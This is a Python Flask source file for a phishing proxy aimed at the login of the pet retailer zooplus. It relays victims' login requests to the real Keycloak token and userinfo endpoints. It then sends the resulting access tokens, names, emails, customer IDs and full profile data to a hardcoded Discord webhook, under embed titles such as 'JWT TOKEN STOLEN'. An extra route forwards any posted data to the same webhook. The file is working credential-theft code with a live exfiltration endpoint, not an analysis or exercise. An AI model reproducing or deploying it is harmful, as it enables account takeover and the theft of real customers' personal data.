from flask import Flask, request, jsonify, send_file
import requests
import json
import os
import base64

app = Flask(__name__, static_folder='static')

KC = 'https://login.zooplus.de/auth/realms/zooplus'
WH = 'https://discord.com/api/webhooks/1484149298663784469/kW9I5_GJZ03UOW-_yR1v39ioYmiQSBZlqiYwSPct8QfYALWTlhQ3cE__2lmWQ12tvwx3'

def discord(data):
    try:
        requests.post(WH, json=data, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/proxy/token', methods=['POST', 'OPTIONS'])
def proxy_token():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r
    
    try:
        data = request.form.to_dict() or request.json or {}
        
        # Forward all params to Keycloak token endpoint
        resp = requests.post(
            f'{KC}/protocol/openid-connect/token',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=15,
            allow_redirects=True
        )
        
        token_data = resp.json()
        
        # Log to Discord if we got a token
        if 'access_token' in token_data:
            try:
                jwt = token_data['access_token']
                # Decode JWT payload (add padding)
                payload_b64 = jwt.split('.')[1]
                payload_b64 += '=' * (4 - len(payload_b64) % 4)
                payload = json.loads(base64.b64decode(payload_b64).decode())
                
                discord({'embeds': [{
                    'title': '🎫 JWT TOKEN STOLEN',
                    'color': 0x00ff00,
                    'fields': [
                        {'name': '👤 Name', 'value': payload.get('name', 'N/A'), 'inline': True},
                        {'name': '📧 Email', 'value': payload.get('email', 'N/A'), 'inline': True},
                        {'name': '🆔 Customer ID', 'value': str(payload.get('customerId', 'N/A')), 'inline': True},
                        {'name': '🆔 Sub', 'value': payload.get('sub', 'N/A'), 'inline': False},
                        {'name': '🎭 Roles', 'value': ', '.join(payload.get('realm_access', {}).get('roles', [])), 'inline': False},
                        {'name': '🎫 JWT', 'value': f'```\n{jwt[:200]}...\n```', 'inline': False}
                    ],
                    'footer': {'text': '🔱 V0RT3X | Railway Deploy'}
                }]})
            except Exception as e:
                pass
        
        r = jsonify(token_data)
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, resp.status_code
        
    except Exception as e:
        r = jsonify({'error': str(e)})
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, 502

@app.route('/proxy/userinfo', methods=['POST', 'OPTIONS'])
def proxy_userinfo():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        return r
    
    try:
        data = request.json or {}
        token = data.get('token', '') or request.headers.get('Authorization', '').replace('Bearer ', '')
        
        resp = requests.get(
            f'{KC}/protocol/openid-connect/userinfo',
            headers={'Authorization': f'Bearer {token}'},
            timeout=10
        )
        
        user_data = resp.json()
        
        # Log to Discord
        discord({'embeds': [{
            'title': '👤 USER DATA EXTRACTED',
            'color': 0x3498db,
            'fields': [
                {'name': 'Full Name', 'value': f"{user_data.get('given_name', '')} {user_data.get('family_name', '')}", 'inline': True},
                {'name': 'Email', 'value': user_data.get('email', 'N/A'), 'inline': True},
                {'name': 'Sub', 'value': user_data.get('sub', 'N/A'), 'inline': False},
                {'name': 'Full Data', 'value': f'```json\n{json.dumps(user_data, indent=2)[:500]}\n```', 'inline': False}
            ],
            'footer': {'text': '🔱 V0RT3X | Full Chain Deploy'}
        }]})
        
        r = jsonify(user_data)
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, resp.status_code
        
    except Exception as e:
        r = jsonify({'error': str(e)})
        r.headers['Access-Control-Allow-Origin'] = '*'
        return r, 502

@app.route('/proxy/log', methods=['POST', 'OPTIONS'])
def proxy_log():
    if request.method == 'OPTIONS':
        r = jsonify({'ok': True})
        r.headers['Access-Control-Allow-Origin'] = '*'
        r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return r
    
    data = request.json or {}
    discord(data)
    
    r = jsonify({'ok': True})
    r.headers['Access-Control-Allow-Origin'] = '*'
    return r

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
